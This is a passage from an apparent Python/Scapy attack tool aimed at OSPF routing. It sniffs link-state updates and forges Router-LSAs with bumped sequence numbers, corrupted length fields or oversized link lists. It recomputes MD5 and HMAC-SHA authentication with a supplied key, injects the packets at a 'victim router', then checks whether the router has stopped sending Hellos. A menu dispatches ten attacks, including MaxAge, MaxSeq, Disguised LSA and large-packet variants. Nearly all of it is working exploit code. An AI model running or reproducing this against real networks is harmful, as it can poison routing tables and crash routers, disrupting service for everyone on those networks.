			pkts_atk[lenpkts][OSPF_Router_LSA].seq += 20
			pkts_atk[lenpkts][OSPF_Hdr].seq +=20 #<<<auth crypt sequence
			print("The IP address of victim router is: " + srcIP)
			#print(srcIP)
			if selnine == "9.1":
				pkts_atk[lenpkts][OSPF_Router_LSA].len = 0
			if selnine == "9.2":
				pkts_atk[lenpkts][OSPF_Router_LSA].len -= 10
			if selnine == "9.3":
				pkts_atk[lenpkts][OSPF_Router_LSA].len += 10
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			del pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts])) #won't reset the len field
			
			ospf_header_nov4 = pkts_atk[lenpkts][OSPF_Hdr] #cut ipv4 header out
			ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk[lenpkts][OSPF_Hdr].len] #left only pure header, no auth hash at the back
			
			i_pad = ('\x36'*(64))
			o_pad = ('\x5c'*(64))
			aa_pad = ('878fe1f3'*(8))
			a_pad = (aa_pad.decode('hex'))
			
			def xor_strings(xs, ys):
				return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))

			i_key_pad = xor_strings(key_padd,i_pad)
			o_key_pad = xor_strings(key_padd,o_pad)
			
			hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
			genhash1 = hashlib.sha256()
			genhash1.update(hash_sum_1)

			hash_sum_2 = o_key_pad + genhash1.digest()
			genhash2 = hashlib.sha256()
			genhash2.update(hash_sum_2)
			
			pkts_new = str(pkts_atk[lenpkts])[:34] + ospf_header_cuthash + genhash2.digest()
			pkts_new = pkts_new.__class__(str(pkts_new))
			print ("\n")
			print("Sending forged packet in 10 seconds")
			time.sleep(10)
			sendp(pkts_new, verbose=1)
			print("checking for vulnerable, 20 seconds")
			chkvuln(srcIP)		
	
		elif get_authtype(pkts_atk[lenpkts]) == "2_sha384" :
			srcIP = pkts_atk[lenpkts][IP].src
			pkts_atk[lenpkts][OSPF_Router_LSA].seq += 20
			pkts_atk[lenpkts][OSPF_Hdr].seq +=20 #<<<auth crypt sequence
			print("The IP address of victim router is: " + srcIP)
			#print(srcIP)
			if selnine == "9.1":
				pkts_atk[lenpkts][OSPF_Router_LSA].len = 0
			if selnine == "9.2":
				pkts_atk[lenpkts][OSPF_Router_LSA].len -= 10
			if selnine == "9.3":
				pkts_atk[lenpkts][OSPF_Router_LSA].len += 10
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			del pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts])) #won't reset the len field
			
			ospf_header_nov4 = pkts_atk[lenpkts][OSPF_Hdr] #cut ipv4 header out
			ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk[lenpkts][OSPF_Hdr].len] #left only pure header, no auth hash at the back
			
			i_pad = ('\x36'*(128))
			o_pad = ('\x5c'*(128))
			aa_pad = ('878fe1f3'*(12))
			a_pad = (aa_pad.decode('hex'))
			
			def xor_strings(xs, ys):
				return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))

			i_key_pad = xor_strings(key_padd,i_pad)
			o_key_pad = xor_strings(key_padd,o_pad)
			
			hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
			genhash1 = hashlib.sha384()
			genhash1.update(hash_sum_1)

			hash_sum_2 = o_key_pad + genhash1.digest()
			genhash2 = hashlib.sha384()
			genhash2.update(hash_sum_2)
			
			pkts_new = str(pkts_atk[lenpkts])[:34] + ospf_header_cuthash + genhash2.digest()
			pkts_new = pkts_new.__class__(str(pkts_new))
			print ("\n")
			print("Sending forged packet in 10 seconds")
			time.sleep(10)
			sendp(pkts_new, verbose=1)
			print("checking for vulnerable, 20 seconds")
			chkvuln(srcIP)		
			
		elif get_authtype(pkts_atk[lenpkts]) == "2_sha512" :
			srcIP = pkts_atk[lenpkts][IP].src
			pkts_atk[lenpkts][OSPF_Router_LSA].seq += 20
			pkts_atk[lenpkts][OSPF_Hdr].seq +=20 #<<<auth crypt sequence
			print("The IP address of victim router is: " + srcIP)
			#print(srcIP)
			if selnine == "9.1":
				pkts_atk[lenpkts][OSPF_Router_LSA].len = 0
			if selnine == "9.2":
				pkts_atk[lenpkts][OSPF_Router_LSA].len -= 10
			if selnine == "9.3":
				pkts_atk[lenpkts][OSPF_Router_LSA].len += 10
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			del pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts])) #won't reset the len field
			
			ospf_header_nov4 = pkts_atk[lenpkts][OSPF_Hdr] #cut ipv4 header out
			ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk[lenpkts][OSPF_Hdr].len] #left only pure header, no auth hash at the back
			
			i_pad = ('\x36'*(128))
			o_pad = ('\x5c'*(128))
			aa_pad = ('878fe1f3'*(16))
			a_pad = (aa_pad.decode('hex'))
			
			def xor_strings(xs, ys):
				return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))

			i_key_pad = xor_strings(key_padd,i_pad)
			o_key_pad = xor_strings(key_padd,o_pad)
			
			hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
			genhash1 = hashlib.sha512()
			genhash1.update(hash_sum_1)

			hash_sum_2 = o_key_pad + genhash1.digest()
			genhash2 = hashlib.sha512()
			genhash2.update(hash_sum_2)
			
			pkts_new = str(pkts_atk[lenpkts])[:34] + ospf_header_cuthash + genhash2.digest()
			pkts_new = pkts_new.__class__(str(pkts_new))
			print ("\n")
			print("Sending forged packet in 10 seconds")
			time.sleep(10)
			sendp(pkts_new, verbose=1)
			print("checking for vulnerable, 20 seconds")
			chkvuln(srcIP)		
		time.sleep(5)
		main()
		Attacks()
	def Ten_Largepacket_attack(): #Done wait for testing
		print("")
		load_contrib('ospf')
		print("Intercepting OSPF's LSU. Please wait, this may take up to 30 minutes")
		
		def stopfilter(x):
			#time.sleep(1)
			if x[OSPF_Hdr].type == 4 and "OSPF_Router_LSA" in x : #to select only packet with Router_LSA not Network-LSA 
				if x[OSPF_LSUpd].lsacount == 1:
					return True
			else:
				return False
		pkts_atk=sniff(filter="ip proto 0x59", stop_filter=stopfilter) #sniff for LSUpdate
		
		def chkvuln(srcIP):
			pkts_chk=sniff(filter="ip proto 0x59", timeout = 20)
			FFb=False
			for index in range(len(pkts_chk)): 
				try: 
					if pkts_chk[index][IP].src == srcIP:
						print "Hello received, not vulnerable for Sending large size OSPF Router-LSA Packet"
						sta10 = "     Hello received, not vulnerable for Sending LSA-update with crafted length fields Attack"
						FFb=True
						break;
				except IndexError:
					FFb=False
					continue
			if FFb != True:		
				print('No Hello received, vulnerable for Sending LSA-update with crafted length fields Attack')
				sta10 = "     No Hello received, vulnerable for Sending LSA-update with crafted length fields Attack"
		
		lenpkts = len(pkts_atk)-1 #to select the last packet captured from sniffed
		
		if get_authtype(pkts_atk[lenpkts]) == "0_no" :
			srcIP = pkts_atk[lenpkts][IP].src
			print("The IP address of victim router is: " + srcIP)
			pkts_atk[lenpkts][OSPF_Router_LSA].seq += 20
			pkts_atk[lenpkts][IP].len=1500
			pureheader=str(pkts_atk[lenpkts])[:62]
			
			linkcounts=pkts_atk[lenpkts][OSPF_Router_LSA].linkcount #save as linkcounts
			noloop = 119-linkcounts #119 max 120 cant
			pkts_atk[lenpkts][OSPF_Router_LSA].linkcount=noloop + linkcounts #need to fake this
			pkts_atk[lenpkts][OSPF_Router_LSA].len = 1000
			strpkts_atk = str(pkts_atk[lenpkts][OSPF_Router_LSA])
			
			Exlinklist = pkts_atk[lenpkts][OSPF_Router_LSA].linklist[0]
			strExlinklist = str(Exlinklist)
			comblinklists_pkts = strpkts_atk + (strExlinklist*noloop)
			
			combheader = pureheader + comblinklists_pkts
			combheader = Ether(combheader)
			del combheader[OSPF_Hdr].len
			combheader=combheader.__class__(str(combheader))
			combheader[OSPF_Hdr].len = len(combheader[OSPF_Hdr])
			combheader[OSPF_Router_LSA].len = len(combheader[OSPF_Router_LSA])
			
			ospf_header_cuthash = str(combheader[OSPF_Hdr])
			pkts_new = str(combheader)[:34] + ospf_header_cuthash
			
			pkts_new=Ether(pkts_new)
			pkts_new[IP].len = len(pkts_new[IP])
			del pkts_new[IP].chksum
			del pkts_new[OSPF_Hdr].chksum
			del pkts_new[OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_new = pkts_new.__class__(str(pkts_new))
			
			
			print("sending packet in 10 seconds")
			print("Checksum = " + hex(pkts_new[OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Sequence = " + hex(pkts_new[OSPF_Router_LSA].seq))
			time.sleep(10)
			sendp(pkts_new, verbose=1)
			print("checking for vulnerable, 20 seconds")
			chkvuln(srcIP)
			
		elif get_authtype(pkts_atk[lenpkts]) == "1_plain" :
			srcIP = pkts_atk[lenpkts][IP].src
			print("The IP address of victim router is: " + srcIP)
			pkts_atk[lenpkts][OSPF_Router_LSA].seq += 20
			pkts_atk[lenpkts][IP].len=1500
			pureheader=str(pkts_atk[lenpkts])[:62]
			
			linkcounts=pkts_atk[lenpkts][OSPF_Router_LSA].linkcount #save as linkcounts
			noloop = 119-linkcounts #119 max 120 cant
			pkts_atk[lenpkts][OSPF_Router_LSA].linkcount=noloop + linkcounts #need to fake this
			pkts_atk[lenpkts][OSPF_Router_LSA].len = 1000
			strpkts_atk = str(pkts_atk[lenpkts][OSPF_Router_LSA])
			
			Exlinklist = pkts_atk[lenpkts][OSPF_Router_LSA].linklist[0]
			strExlinklist = str(Exlinklist)
			comblinklists_pkts = strpkts_atk + (strExlinklist*noloop)
			
			combheader = pureheader + comblinklists_pkts
			combheader = Ether(combheader)
			del combheader[OSPF_Hdr].len
			combheader=combheader.__class__(str(combheader))
			combheader[OSPF_Hdr].len = len(combheader[OSPF_Hdr])
			combheader[OSPF_Router_LSA].len = len(combheader[OSPF_Router_LSA])
			
			ospf_header_cuthash = str(combheader[OSPF_Hdr])
			pkts_new = str(combheader)[:34] + ospf_header_cuthash
			
			pkts_new=Ether(pkts_new)
			pkts_new[IP].len = len(pkts_new[IP])
			del pkts_new[IP].chksum
			del pkts_new[OSPF_Hdr].chksum
			del pkts_new[OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_new = pkts_new.__class__(str(pkts_new))
			
			
			print("sending packet in 10 seconds")
			print("Checksum = " + hex(pkts_new[OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Sequence = " + hex(pkts_new[OSPF_Router_LSA].seq))
			time.sleep(10)
			sendp(pkts_new, verbose=1)
			print("checking for vulnerable, 20 seconds")
			chkvuln(srcIP)
			
		elif get_authtype(pkts_atk[lenpkts]) == "2_md" :
			srcIP = pkts_atk[lenpkts][IP].src
			print("The IP address of victim router is: " + srcIP)
			pkts_atk[lenpkts][OSPF_Router_LSA].seq += 20
			pkts_atk[lenpkts][OSPF_Hdr].seq +=20 #<<<auth crypt sequence
			pkts_atk[lenpkts][IP].len=1500
			pureheader=str(pkts_atk[lenpkts])[:62]
			
			linkcounts=pkts_atk[lenpkts][OSPF_Router_LSA].linkcount #save as linkcounts
			noloop = 117-linkcounts #118 is too long
			pkts_atk[lenpkts][OSPF_Router_LSA].linkcount=noloop + linkcounts #need to fake this
			pkts_atk[lenpkts][OSPF_Router_LSA].len = 1000
			strpkts_atk = str(pkts_atk[lenpkts][OSPF_Router_LSA])
			
			Exlinklist = pkts_atk[lenpkts][OSPF_Router_LSA].linklist[0]
			strExlinklist = str(Exlinklist)
			comblinklists_pkts = strpkts_atk + (strExlinklist*noloop)
			
			combheader = pureheader + comblinklists_pkts
			combheader = Ether(combheader)
			del combheader[OSPF_Hdr].len
			combheader=combheader.__class__(str(combheader))
			combheader[OSPF_Hdr].len = len(combheader[OSPF_Hdr])
			combheader[OSPF_Router_LSA].len = len(combheader[OSPF_Router_LSA])
			#use HDR for authen here
			ospf_header_cuthash = str(combheader[OSPF_Hdr])
			ospf_header_combine = ospf_header_cuthash + key_padd
			genhash = hashlib.md5()
			genhash.update(ospf_header_combine)
			pkts_new = str(combheader)[:34] + ospf_header_cuthash + genhash.digest()
			
			pkts_new=Ether(pkts_new)
			pkts_new[IP].len = len(pkts_new[IP])
			del pkts_new[IP].chksum
			del pkts_new[OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_new = pkts_new.__class__(str(pkts_new))
			
			print("sending packet in 10 seconds")
			print("Checksum = " + hex(pkts_new[OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Sequence = " + hex(pkts_new[OSPF_Router_LSA].seq))
			time.sleep(10)
			sendp(pkts_new, verbose=1)
			print("checking for vulnerable, 20 seconds")
			chkvuln(srcIP)
		
		elif get_authtype(pkts_atk[lenpkts]) == "2_sha1" :
			srcIP = pkts_atk[lenpkts][IP].src
			print("The IP address of victim router is: " + srcIP)
			pkts_atk[lenpkts][OSPF_Router_LSA].seq += 20
			pkts_atk[lenpkts][OSPF_Hdr].seq +=20 #<<<auth crypt sequence
			pkts_atk[lenpkts][IP].len=1500
			pureheader=str(pkts_atk[lenpkts])[:62]
			
			linkcounts=pkts_atk[lenpkts][OSPF_Router_LSA].linkcount #save as linkcounts
			noloop = 117-linkcounts #118 is too long
			pkts_atk[lenpkts][OSPF_Router_LSA].linkcount=noloop + linkcounts #need to fake this
			pkts_atk[lenpkts][OSPF_Router_LSA].len = 1000
			strpkts_atk = str(pkts_atk[lenpkts][OSPF_Router_LSA])
			
			Exlinklist = pkts_atk[lenpkts][OSPF_Router_LSA].linklist[0]
			strExlinklist = str(Exlinklist)
			comblinklists_pkts = strpkts_atk + (strExlinklist*noloop)
			
			combheader = pureheader + comblinklists_pkts
			combheader = Ether(combheader)
			del combheader[OSPF_Hdr].len
			combheader=combheader.__class__(str(combheader))
			combheader[OSPF_Hdr].len = len(combheader[OSPF_Hdr])
			combheader[OSPF_Router_LSA].len = len(combheader[OSPF_Router_LSA])
			#use HDR for authen here
			
			ospf_header_cuthash = str(combheader[OSPF_Hdr])
			
			i_pad = ('\x36'*(64))
			o_pad = ('\x5c'*(64))
			aa_pad = ('878fe1f3'*(5))
			a_pad = (aa_pad.decode('hex'))
			
			def xor_strings(xs, ys):
				return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))

			i_key_pad = xor_strings(key_padd,i_pad)
			o_key_pad = xor_strings(key_padd,o_pad)
			
			hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
			genhash1 = hashlib.sha1()
			genhash1.update(hash_sum_1)

			hash_sum_2 = o_key_pad + genhash1.digest()
			genhash2 = hashlib.sha1()
			genhash2.update(hash_sum_2)
			
			pkts_new = str(combheader)[:34] + ospf_header_cuthash + genhash2.digest()
			
			pkts_new=Ether(pkts_new)
			pkts_new[IP].len = len(pkts_new[IP])
			del pkts_new[IP].chksum
			del pkts_new[OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_new = pkts_new.__class__(str(pkts_new))
			
			print("sending packet in 10 seconds")
			print("Checksum = " + hex(pkts_new[OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Sequence = " + hex(pkts_new[OSPF_Router_LSA].seq))
			time.sleep(10)
			sendp(pkts_new, verbose=1)
			print("checking for vulnerable, 20 seconds")
			chkvuln(srcIP)
			
		elif get_authtype(pkts_atk[lenpkts]) == "2_sha256" :
			srcIP = pkts_atk[lenpkts][IP].src
			print("The IP address of victim router is: " + srcIP)
			pkts_atk[lenpkts][OSPF_Router_LSA].seq += 20
			pkts_atk[lenpkts][OSPF_Hdr].seq +=20 #<<<auth crypt sequence
			pkts_atk[lenpkts][IP].len=1500
			pureheader=str(pkts_atk[lenpkts])[:62]
			
			linkcounts=pkts_atk[lenpkts][OSPF_Router_LSA].linkcount #save as linkcounts
			noloop = 116-linkcounts #118 is too long
			pkts_atk[lenpkts][OSPF_Router_LSA].linkcount=noloop + linkcounts #need to fake this
			pkts_atk[lenpkts][OSPF_Router_LSA].len = 1000
			strpkts_atk = str(pkts_atk[lenpkts][OSPF_Router_LSA])
			
			Exlinklist = pkts_atk[lenpkts][OSPF_Router_LSA].linklist[0]
			strExlinklist = str(Exlinklist)
			comblinklists_pkts = strpkts_atk + (strExlinklist*noloop)
			
			combheader = pureheader + comblinklists_pkts
			combheader = Ether(combheader)
			del combheader[OSPF_Hdr].len
			combheader=combheader.__class__(str(combheader))
			combheader[OSPF_Hdr].len = len(combheader[OSPF_Hdr])
			combheader[OSPF_Router_LSA].len = len(combheader[OSPF_Router_LSA])
			#use HDR for authen here
			
			ospf_header_cuthash = str(combheader[OSPF_Hdr])
			
			i_pad = ('\x36'*(64))
			o_pad = ('\x5c'*(64))
			aa_pad = ('878fe1f3'*(8))
			a_pad = (aa_pad.decode('hex'))
			
			def xor_strings(xs, ys):
				return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))

			i_key_pad = xor_strings(key_padd,i_pad)
			o_key_pad = xor_strings(key_padd,o_pad)
			
			hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
			genhash1 = hashlib.sha256()
			genhash1.update(hash_sum_1)

			hash_sum_2 = o_key_pad + genhash1.digest()
			genhash2 = hashlib.sha256()
			genhash2.update(hash_sum_2)
			
			pkts_new = str(combheader)[:34] + ospf_header_cuthash + genhash2.digest()
			
			pkts_new=Ether(pkts_new)
			pkts_new[IP].len = len(pkts_new[IP])
			del pkts_new[IP].chksum
			del pkts_new[OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_new = pkts_new.__class__(str(pkts_new))
			
			print("sending packet in 10 seconds")
			print("Checksum = " + hex(pkts_new[OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Sequence = " + hex(pkts_new[OSPF_Router_LSA].seq))
			time.sleep(10)
			sendp(pkts_new, verbose=1)
			print("checking for vulnerable, 20 seconds")
			chkvuln(srcIP)	
		
		elif get_authtype(pkts_atk[lenpkts]) == "2_sha384" :
			srcIP = pkts_atk[lenpkts][IP].src
			print("The IP address of victim router is: " + srcIP)
			pkts_atk[lenpkts][OSPF_Router_LSA].seq += 20
			pkts_atk[lenpkts][OSPF_Hdr].seq +=20 #<<<auth crypt sequence
			pkts_atk[lenpkts][IP].len=1500
			pureheader=str(pkts_atk[lenpkts])[:62]
			
			linkcounts=pkts_atk[lenpkts][OSPF_Router_LSA].linkcount #save as linkcounts
			noloop = 115-linkcounts #118 is too long
			pkts_atk[lenpkts][OSPF_Router_LSA].linkcount=noloop + linkcounts #need to fake this
			pkts_atk[lenpkts][OSPF_Router_LSA].len = 1000
			strpkts_atk = str(pkts_atk[lenpkts][OSPF_Router_LSA])
			
			Exlinklist = pkts_atk[lenpkts][OSPF_Router_LSA].linklist[0]
			strExlinklist = str(Exlinklist)
			comblinklists_pkts = strpkts_atk + (strExlinklist*noloop)
			
			combheader = pureheader + comblinklists_pkts
			combheader = Ether(combheader)
			del combheader[OSPF_Hdr].len
			combheader=combheader.__class__(str(combheader))
			combheader[OSPF_Hdr].len = len(combheader[OSPF_Hdr])
			combheader[OSPF_Router_LSA].len = len(combheader[OSPF_Router_LSA])
			#use HDR for authen here
			
			ospf_header_cuthash = str(combheader[OSPF_Hdr])
			
			i_pad = ('\x36'*(128))
			o_pad = ('\x5c'*(128))
			aa_pad = ('878fe1f3'*(12))
			a_pad = (aa_pad.decode('hex'))
			
			def xor_strings(xs, ys):
				return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))

			i_key_pad = xor_strings(key_padd,i_pad)
			o_key_pad = xor_strings(key_padd,o_pad)
			
			hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
			genhash1 = hashlib.sha384()
			genhash1.update(hash_sum_1)

			hash_sum_2 = o_key_pad + genhash1.digest()
			genhash2 = hashlib.sha384()
			genhash2.update(hash_sum_2)
			
			pkts_new = str(combheader)[:34] + ospf_header_cuthash + genhash2.digest()
			
			pkts_new=Ether(pkts_new)
			pkts_new[IP].len = len(pkts_new[IP])
			del pkts_new[IP].chksum
			del pkts_new[OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_new = pkts_new.__class__(str(pkts_new))
			
			print("sending packet in 10 seconds")
			print("Checksum = " + hex(pkts_new[OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Sequence = " + hex(pkts_new[OSPF_Router_LSA].seq))
			time.sleep(10)
			sendp(pkts_new, verbose=1)
			print("checking for vulnerable, 20 seconds")
			chkvuln(srcIP)
			
		elif get_authtype(pkts_atk[lenpkts]) == "2_sha512" :
			srcIP = pkts_atk[lenpkts][IP].src
			print("The IP address of victim router is: " + srcIP)
			pkts_atk[lenpkts][OSPF_Router_LSA].seq += 20
			pkts_atk[lenpkts][OSPF_Hdr].seq +=20 #<<<auth crypt sequence
			pkts_atk[lenpkts][IP].len=1500
			pureheader=str(pkts_atk[lenpkts])[:62]
			
			linkcounts=pkts_atk[lenpkts][OSPF_Router_LSA].linkcount #save as linkcounts
			noloop = 113-linkcounts #118 is too long
			pkts_atk[lenpkts][OSPF_Router_LSA].linkcount=noloop + linkcounts #need to fake this
			pkts_atk[lenpkts][OSPF_Router_LSA].len = 1000
			strpkts_atk = str(pkts_atk[lenpkts][OSPF_Router_LSA])
			
			Exlinklist = pkts_atk[lenpkts][OSPF_Router_LSA].linklist[0]
			strExlinklist = str(Exlinklist)
			comblinklists_pkts = strpkts_atk + (strExlinklist*noloop)
			
			combheader = pureheader + comblinklists_pkts
			combheader = Ether(combheader)
			del combheader[OSPF_Hdr].len
			combheader=combheader.__class__(str(combheader))
			combheader[OSPF_Hdr].len = len(combheader[OSPF_Hdr])
			combheader[OSPF_Router_LSA].len = len(combheader[OSPF_Router_LSA])
			#use HDR for authen here
			
			ospf_header_cuthash = str(combheader[OSPF_Hdr])
			
			i_pad = ('\x36'*(128))
			o_pad = ('\x5c'*(128))
			aa_pad = ('878fe1f3'*(16))
			a_pad = (aa_pad.decode('hex'))
			
			def xor_strings(xs, ys):
				return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))

			i_key_pad = xor_strings(key_padd,i_pad)
			o_key_pad = xor_strings(key_padd,o_pad)
			
			hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
			genhash1 = hashlib.sha512()
			genhash1.update(hash_sum_1)

			hash_sum_2 = o_key_pad + genhash1.digest()
			genhash2 = hashlib.sha512()
			genhash2.update(hash_sum_2)
			
			pkts_new = str(combheader)[:34] + ospf_header_cuthash + genhash2.digest()
			
			pkts_new=Ether(pkts_new)
			pkts_new[IP].len = len(pkts_new[IP])
			del pkts_new[IP].chksum
			del pkts_new[OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_new = pkts_new.__class__(str(pkts_new))
			
			print("sending packet in 10 seconds")
			print("Checksum = " + hex(pkts_new[OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Sequence = " + hex(pkts_new[OSPF_Router_LSA].seq))
			time.sleep(10)
			sendp(pkts_new, verbose=1)
			print("checking for vulnerable, 20 seconds")
			chkvuln(srcIP)	
		time.sleep(5)
		main()
		Attacks()	
	if Selected_Attack == "1":
		one_seqPP_attack()
	elif Selected_Attack == "2":
		Two_MaxAge_attack()	
	elif Selected_Attack == "3":
		Three_MaxSeq_attack()
	elif Selected_Attack == "4":
		Four_Disguised_attack()
	elif Selected_Attack == "5":
		Five_RemoteFalse_attack()
	elif Selected_Attack == "6":
		Six_Persist_attack()
	elif Selected_Attack == "7":
		Seven_BRBDR_attack()
	elif Selected_Attack == "8":
		Eight_ManyHello_attack()
	#elif Selected_Attack == "9":
		#Nine_InvalidLength_attack()
	elif Selected_Attack == "9.1":
		Selnine="9.1"
		Nine_InvalidLength_attack(Selnine)
	elif Selected_Attack == "9.2":
		Selnine="9.2"
		Nine_InvalidLength_attack(Selnine)
	elif Selected_Attack == "9.3":
		Selnine="9.3"
		Nine_InvalidLength_attack(Selnine)
	elif Selected_Attack == "10":
		Ten_Largepacket_attack()
		
Attacks()






		
		

		

